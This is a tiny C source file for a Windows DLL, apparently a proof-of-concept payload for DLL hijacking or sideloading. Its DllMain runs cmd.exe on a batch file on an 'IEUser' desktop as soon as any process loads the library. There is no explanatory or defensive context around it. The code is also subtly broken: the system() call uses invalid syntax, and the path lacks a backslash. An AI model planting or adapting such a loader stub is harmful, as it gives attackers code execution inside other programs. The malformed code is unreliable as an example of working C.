#include <windows.h>
#include "stdlib.h"

BOOL APIENTRY DllMain(HMODULE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved){
	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
	system(const char *"cmd.exe \"C:Users\\IEUser\\Desktop\\a.bat\"");
}
return TRUE;
}
